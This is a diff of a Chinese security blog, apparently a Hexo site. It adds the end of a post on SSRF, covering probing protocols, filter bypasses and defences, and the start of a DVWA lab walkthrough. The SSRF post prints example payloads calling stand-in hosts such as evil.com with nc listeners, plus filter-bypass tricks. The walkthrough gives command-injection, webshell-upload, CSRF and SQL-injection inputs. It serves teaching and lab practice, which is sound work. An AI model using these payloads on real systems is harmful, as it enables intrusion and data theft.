+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>4、ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;</strong></p>
+<p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>5、tftp:&#x2F;&#x2F;</strong></p>
+<p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>6、gopher:&#x2F;&#x2F;</strong></p>
+<p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);?&gt;</span><br><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure></blockquote>
+<hr>
+<h2 id="六、SSRF漏洞利用（危害）"><a href="#六、SSRF漏洞利用（危害）" class="headerlink" title="六、SSRF漏洞利用（危害）"></a>六、SSRF漏洞利用（危害）</h2><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
+<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
+<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
+<p>5.利用file协议读取本地文件等。.</p>
+<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
+<p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p>
+<hr>
+<h2 id="七、SSRF绕过方式"><a href="#七、SSRF绕过方式" class="headerlink" title="七、SSRF绕过方式"></a>七、SSRF绕过方式</h2><p><strong>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</strong></p>
+<p>一、常见的绕过方式</p>
+<p><strong>1、限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</strong></p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以尝试采用http基本身份认证的方式绕过</span><br><span class="line">如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</span><br><span class="line">在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>2.采用短网址绕过</strong></p>
+<blockquote>
+<p>比如百度短地址<a target="_blank" rel="noopener" href="https://dwz.cn/">https://dwz.cn/</a></p>
+</blockquote>
+<p><strong>3.采用进制转换</strong></p>
+<blockquote>
+<p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
+</blockquote>
+<p><img src="/.com//image-20250520030023-ukm1uls.png" alt="image"></p>
+<p><strong>4.利用特殊域名</strong></p>
+<blockquote>
+<p>原理是DNS解析。<strong>xip.io</strong>可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p>
+</blockquote>
+<p><strong>5.利用[::]</strong></p>
+<blockquote>
+<p>可以利用[::]来绕过localhost<br><a target="_blank" rel="noopener" href="http://169.254.169.254/%3E/%3Ehttp://[::169.254.169.254]">http://169.254.169.254\&gt;\&gt;http://[::169.254.169.254]</a></p>
+</blockquote>
+<p><strong>6.利用句号</strong></p>
+<blockquote>
+<p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p>
+</blockquote>
+<p><strong>7、CRLF 编码绕过</strong></p>
+<blockquote>
+<p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </span><br></pre></td></tr></table></figure>
+
+<p><strong>8.利用封闭的字母数字</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com</span><br><span class="line">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ</span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ</span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴</span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
+
+<p>二、常见限制</p>
+<p>1.限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p>
+<blockquote>
+<p>采用http基本身份认证的方式绕过，即@<br><a target="_blank" rel="noopener" href="http://www.xxx.com@www.xxc.com/">http://www.xxx.com@www.xxc.com</a></p>
+</blockquote>
+<p>2.限制请求IP不为内网地址</p>
+<blockquote>
+<p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p>
+</blockquote>
+<p>3.限制请求只为http协议</p>
+<blockquote>
+<p>（1）采取302跳转<br>（2）采取短地址</p>
+</blockquote>
+<hr>
+<h2 id="八、SSRF漏防御"><a href="#八、SSRF漏防御" class="headerlink" title="八、SSRF漏防御"></a>八、SSRF漏防御</h2><p>通常有以下5个思路：</p>
+<p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
+<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
+<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmaxy8gbj000akg7kflpsdoee" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/SSRF/" data-id="cmaxygi0k0009oc7ka0i1e8nq" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/DVWA靶场通关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="DVWA靶场通关"><a href="#DVWA靶场通关" class="headerlink" title="DVWA靶场通关"></a>DVWA靶场通关</h1><h2 id="1-暴力破解-brute-force"><a href="#1-暴力破解-brute-force" class="headerlink" title="1.暴力破解 brute force"></a>1.暴力破解 brute force</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><blockquote>
+<p>使用bp抓包，分别在username和password处添加变量，使用集束炸弹（cluster bomb）模式，添加字典进行爆破</p>
+</blockquote>
+<p><img src="/.com//0c1252a336f1a19d4a0c461a2625dfbd-20250425163154-kusite3.png" alt="0c1252a336f1a19d4a0c461a2625dfbd"></p>
+<p><img src="/.com//6a77d729ad1c18c986d038672540d012-20250425164624-cuo7973.png" alt="6a77d729ad1c18c986d038672540d012"></p>
+<p>可以手工SQL注入（万能密码），在用户名框中输入admin’ or ‘1’=‘1，任意输入密码即可登陆（同时在弱口令字典里也有该语句）</p>
+<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p> 和low相比，过滤了一些转义字符，但依旧可以使用bp爆破方法同low</p>
+<p><img src="/.com//b25d2a1090203c32d0788cdd25e2dcdc-20250425164628-ohxr4rn.png" alt="b25d2a1090203c32d0788cdd25e2dcdc"></p>
+<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p> 随意输入用户名密码，抓个包可以看到，携带了token</p>
+<p><img src="/.com//b25d2a1090203c32d0788cdd25e2dcdc-20250425164628-ohxr4rn.png" alt="b25d2a1090203c32d0788cdd25e2dcdc-1"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerabilities/brute/?username=123&amp;password=123&amp;Login=Login&amp;user_token=bd32cb5998988f7c2f041f82f0dd701c HTTP/1.1</span><br><span class="line">Host: 69044566-74ca-4a40-bab8-8275aae0037d.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://69044566-74ca-4a40-bab8-8275aae0037d.node5.buuoj.cn:81/vulnerabilities/brute/</span><br><span class="line">Cookie: PHPSESSID=76shf76ao4uqleikshlanj6eh0; security=high</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>发送到Intruder，攻击类型选择交叉攻击Pitchfork，给password和token添加payload位置</p>
+</blockquote>
+<p><img src="/.com//image-20250425164433-gi0ryza.png" alt="image"></p>
+<p><img src="/.com//image-20250425164358-rpkpeox.png" alt="image"></p>
+<p>然后token选择递归提取，并且把初始可用的token代入</p>
+<p><img src="/.com//image-20250425164754-z5wbyc4.png" alt="image"></p>
+<p><img src="/.com//image-20250425164835-vvz11kl.png" alt="image"></p>
+<p>然后开始攻击即可</p>
+<p>‍</p>
+<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>网站提示我们输入ip地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );//函数能执行系统命令</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里我们要说一下命令连接符<br>&amp; ：前面一个命令无论是否执行，后面的命令都能执行，两个命令都执行<br>&amp;&amp;：前面一个命令执行成功后，才能执行后面一个命令，两个命令都执行<br>|：前面一个命令无论是否执行，后面的命令都能执行且只执行后面一个<br>||：前面一个命令不能正常执行后，才能执行后面一个命令</p>
+<p>我们使用“|”符号作为连接符让计算机做出除ping以外的操作实现命令注入<br>结果显示注入成功！<br>命令：127.0.0.1 | dir</p>
+</blockquote>
+<p>‍</p>
+<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><p> 直接分析源码看看和Low等级有什么区别<br> 源码分析：发现在Low等级源码的基础上添加了一个黑名单，把‘&amp;&amp;’字符和‘;’字符过滤掉了，但我们可以使用黑名单之外的命令连接符继续命令注入</p>
+<p><img src="/.com//9275c6eed4da2dc9b0c7c1e5e63d563c-20250425170542-d99goej.png" alt="9275c6eed4da2dc9b0c7c1e5e63d563c"></p>
+<p>‍</p>
+<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><p> 源码分析：发现还是一样的套路，也是过滤字符但过滤得更多了。但仔细观察发现有一个过滤是’| ‘，注意这个过滤是加了空格的，说明这个过滤其实是没用的，只需要’|’后面直接加入参数，不保留空格，我们依然可以用这个命令连接符进行命令注入</p>
+<p><img src="/.com//a24bd3a257d4e129cca8019070a9b07d-20250425170620-rfpguy9.png" alt="a24bd3a257d4e129cca8019070a9b07d"></p>
+<p>‍</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><p> 网站的本意是让我们在网站里更改密码</p>
+<p><img src="/.com//1939fdc85c82e1df86c9b1f916522081-20250425171126-xu4wwp5.png" alt="1939fdc85c82e1df86c9b1f916522081"></p>
+<blockquote>
+<p>但是能够主要到当我们更改密码成功后url栏的参数是这样的<br><a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a><br>可以分析出password_new是我输入的密码，password_conf是我确认的密码，说明我们在网站上输入的信息是会在url栏这里进行一个传输执行</p>
+</blockquote>
+<p><img src="/.com//830adffb3898c5c5488d85ee81e8e6a9-20250425171137-dr9bhdv.png" alt="830adffb3898c5c5488d85ee81e8e6a9"></p>
+<p>抓个包看看，发现url栏的信息和请求的信息是一致的</p>
+<p> <img src="/.com//de160531a83b91e4ff84d165b7a7c13a-20250425171147-iksxt52.png" alt="de160531a83b91e4ff84d165b7a7c13a"></p>
+<blockquote>
+<p>那是不是说明如果我能控制url栏里传入的参数，就能够不在网站内执行更改密码的操作呢？<br>更改url的参数：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=456789&password_conf=456789&Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=456789&amp;password_conf=456789&amp;Change=Change#</a><br>只需要在原来的url基础上该新密码和确认密码的参数即可</p>
+<p>为了显示效果，我使当前页面是密码不匹配状态</p>
+</blockquote>
+<p><img src="/.com//c170717135b963832851ab18cdd7291e-20250425171200-nuulqr6.png" alt="c170717135b963832851ab18cdd7291e"></p>
+<p>在新标签内放入设置好的url，点击执行</p>
+<p><img src="/.com//5c64252299acea56a3b35687d997aeb0-20250425171207-xr9kfct.png" alt="5c64252299acea56a3b35687d997aeb0"></p>
+<p>页面跳转到了dvwa的更改密码界面，csrf攻击成功</p>
+<p><img src="/.com//2ada0b8e5e0e9bc04452aa3935526506-20250425171213-9w5xvbr.png" alt="2ada0b8e5e0e9bc04452aa3935526506"></p>
+<blockquote>
+<p>网站的本意是在网站内更改密码，而我通过控制url的传参就能使我能在网站之外执行更改密码的操作，那么当我知道一个网站有csrf漏洞后也可以通过构造url的方式让别人点击执行他意想之外的行为</p>
+<p>源码分析：源码中只对传入的密码和确认密码进行比较，两者一致则执行更改密码命令成功返回Password Change，不一致则返回Passwords did not match，没有任何过滤，所以能轻易执行csrf漏洞</p>
+</blockquote>
+<p><img src="/.com//f0c609415b16d644263608771e005b1a-20250425171252-o8j4acs.png" alt="f0c609415b16d644263608771e005b1a"></p>
+<p>‍</p>
+<h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><p> 源码分析：和Low等级比较发现，只有一处改变，即在传入密码和确认密码参数前先进行了一个&#x3D;&#x3D;if语句的判断&#x3D;&#x3D;，判断里面的内容主要是验证这个访问请求是否是从&#x3D;&#x3D;dwva网站&#x3D;&#x3D;本身发起的，若不是就不执行后面的操作</p>
+<p><img src="/.com//9dbaa6761aa3ad43ade255e9fe296b30-20250425171315-yfcd81j.png" alt="9dbaa6761aa3ad43ade255e9fe296b30"></p>
+<p>源码是通过referrer这个字段的参数进行判断的，通常情况下在增加referrer验证时就是网站本身当前页面的ip地址，我们通过抓包看看信息</p>
+<p>首先抓一个包，可以看到这里有referer</p>
+<p><img src="/.com//9cea6507c937a1c9f35fd8b63940524c-20250425171659-wyha15h.png" alt="9cea6507c937a1c9f35fd8b63940524c"></p>
+<p>复制刚才构造好的url，在新页面打开：<a target="_blank" rel="noopener" href="http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&password_conf=666666&Change=Change#" title="http:&#x2F;&#x2F;192.168.10.5&#x2F;DVWA&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;666666&amp;password_conf&#x3D;666666&amp;Change&#x3D;Change#">http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new&#x3D;666666&amp;password_conf&#x3D;666666&amp;Change&#x3D;Change#</a></p>
+<p>抓包，发现没有referer</p>
+<p><img src="/.com//3d4b2706cc958a8f1394de205839b040-20250425171716-w1cnaaw.png" alt="3d4b2706cc958a8f1394de205839b040"></p>
+<p>我们自己在这里加一个referer，随意添加，包含本机就可以例如：127.0.0.1</p>
+<p><img src="/.com//ab872067c571ccab991bbebbbe9c311d-20250425171723-miwfpva.png" alt="ab872067c571ccab991bbebbbe9c311d"></p>
+<p>放包，发现已经成功修改</p>
+<p>‍</p>
+<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p> 可以看到，设置了token</p>
+<p> 这里我们采用抓包，把包发到重放模块，在row中可以看到新的token</p>
+<p><img src="/.com//4eb20c2a54b3919e475b47dfde22f4ff-20250425171734-p8nrrqi.png" alt="4eb20c2a54b3919e475b47dfde22f4ff"></p>
+<blockquote>
+<p>接下来使用获取到的新token构造链接</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&password_conf=666666&Change=Change&user_token=9c36edfc71b135e726adce6603be8651">http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&amp;password_conf=666666&amp;Change=Change&amp;user_token=9c36edfc71b135e726adce6603be8651</a></p>
+<p>修改成功</p>
+</blockquote>
+<p>‍</p>
+<h2 id="4-File-inclusion-文件包含"><a href="#4-File-inclusion-文件包含" class="headerlink" title="4.File inclusion 文件包含"></a>4.File inclusion 文件包含</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p> 每次点击都会跳转，所以可以在page=后面添加本地文件路径</p>
+<p><img src="/.com//7386fd3fd2979574a11e49bbf188337a-20250425172020-tcersi4.png" alt="7386fd3fd2979574a11e49bbf188337a"></p>
+<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p> 可以通过ip+路径包含文件</p>
+<p><img src="/.com//d28bea7da6e424606062dfb78c2893e1-20250425172030-4kgs98a.png" alt="d28bea7da6e424606062dfb78c2893e1"></p>
+<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p><img src="/.com//ea03f7407dc9279a2ed7d860673023f0-20250425172036-kxf2wi3.png" alt="ea03f7407dc9279a2ed7d860673023f0"></p>
+<p>源码限制了page之后的参数是以file开头，所以可以用file函数去构建</p>
+<p> <a target="_blank" rel="noopener" href="http://192.168.10.5/DVWA/vulnerabilities/fi/?page=file://E:%5CphpStudy%5CWWW%5CDVWA%5Cfile555.txt" title="http:&#x2F;&#x2F;192.168.10.5&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;E:\phpStudy\WWW\DVWA\file555.txt">http://192.168.10.5/DVWA/vulnerabilities/fi/?page=file://E:\phpStudy\WWW\DVWA\file555.txt</a></p>
+<p><img src="/.com//b94534da3ee8d55a722bd51d644994e6-20250425172043-5fapvh7.png" alt="b94534da3ee8d55a722bd51d644994e6"></p>
+<p>‍</p>
+<h2 id="5-File-upload文件上传"><a href="#5-File-upload文件上传" class="headerlink" title="5.File upload文件上传"></a>5.File upload文件上传</h2><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><p><img src="/.com//c92f0ca2659de359b6dda9fdd58d23cd-20250425172053-9ya348y.png" alt="c92f0ca2659de359b6dda9fdd58d23cd"></p>
+<p>可以看到，没有任何限制，所以直接上传一个php后门文件即可</p>
+<p> 直接上传一句话木马，蚁剑链接即可</p>
+<h3 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h3><p> 可以看到，靶场对文件类型做了限制，只允许上传png、jpeg，并且检查</p>
+<p><img src="/.com//fd8bc231d15557db234ddd92e2d4a745-20250425172423-br5ll4y.png" alt="fd8bc231d15557db234ddd92e2d4a745"></p>
+<p>burp后台改后缀即可</p>
+<p>‍</p>
+<h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><p> 看源代码可以发现，不仅限制了文件类型，而且限制了大小，不能少于100kb</p>
+<p><img src="/.com//42a6ceb6367ab31ef8b9468d9d5c45fb-20250425172446-hhvsnf6.png" alt="42a6ceb6367ab31ef8b9468d9d5c45fb"></p>
+<p>可以上传一个图片马，打开cmd，输入以下命令：<code>copy post2.php/a + 111.png/b 66.png</code>​</p>
+<p><img src="/.com//549490ef5de7cd680ca26bd8f524f483-20250425172455-32a0xdu.png" alt="549490ef5de7cd680ca26bd8f524f483"></p>
+<p>此时已经上传成功，但不能利用</p>
+<p><img src="/.com//4a84d8fcccf0c77b894d775b47aa45cd-20250425172506-52ttghn.png" alt="4a84d8fcccf0c77b894d775b47aa45cd"></p>
+<p>在命令注入中输入127.0.0.1|| ren C:\phpstudy_pro\WWW\DVWA-master\hackable\uploads\888.png 888.php</p>
+<p><img src="/.com//ccfc7557d167997fdc4dd98f505a1078-20250425172532-dnkw477.png" alt="ccfc7557d167997fdc4dd98f505a1078">此时发现，888.png已经被改名为888.php</p>
+<p>‍</p>
+<h2 id="6-insecure-captcha不安全的验证"><a href="#6-insecure-captcha不安全的验证" class="headerlink" title="6.insecure captcha不安全的验证"></a>6.insecure captcha不安全的验证</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><p> 本关是在第二步做验证，所以把step改为2就可以绕过验证</p>
+<p><img src="/.com//eabf443fe5d55d6af0739e5c7df2e765-20250425172652-x0th1hw.png" alt="eabf443fe5d55d6af0739e5c7df2e765"></p>
+<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p> 依旧抓包改包</p>
+<p><img src="/.com//3635ebcbdcf767c961b46cda65863f80-20250425172657-5hierei.png" alt="3635ebcbdcf767c961b46cda65863f80"></p>
+<h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><p><img src="/.com//490a93c21a9bd427fe3d29dea67d7efa-20250425172703-77m3kop.png" alt="490a93c21a9bd427fe3d29dea67d7efa"></p>
+<p>让通过验证的情况增加了一种。原先是只有验证码为真才能通过验证，现在新增“或者g-recaptcha-response且HTTP_USER_AGENT为特定内容”通过验证。</p>
+<p> 那直接用Burpsuite修改数据包</p>
+<p><img src="/.com//8601e5ee714e65e6521aaecea77fbe2d-20250425172708-5gq4swo.png" alt="8601e5ee714e65e6521aaecea77fbe2d"></p>
+<p>‍</p>
+<h2 id="7-SQL-injection-sql注入"><a href="#7-SQL-injection-sql注入" class="headerlink" title="7.SQL injection sql注入"></a>7.SQL injection sql注入</h2><h3 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h3><ol>
+<li>输入1+2，可以看到，并未输出3，所以可以判定是字符型注入</li>
+</ol>
+<p><img src="/.com//91a5a615ee0f8c4b9199dd8788cb79e2-20250425172821-gb4jvax.png" alt="91a5a615ee0f8c4b9199dd8788cb79e2"></p>
+<p>输入如下payload：’1 or 1=1’ ，可以看到有报错，所以一定存在sql注入</p>
+<p><img src="/.com//0ded62d0731c2502d756236e702834a6-20250425172828-2scjktq.png" alt="0ded62d0731c2502d756236e702834a6"></p>
+<p><img src="/.com//4fd521db8e735523d0a818882dce5597-20250425172831-e9o5jfm.png" alt="4fd521db8e735523d0a818882dce5597"></p>
+<p>使用order by判断字段数 1’ order by 2 #</p>
+<p><img src="/.com//a17effc3868eb93c474867f504fe2e02-20250425172838-0nbohx7.png" alt="a17effc3868eb93c474867f504fe2e02"></p>
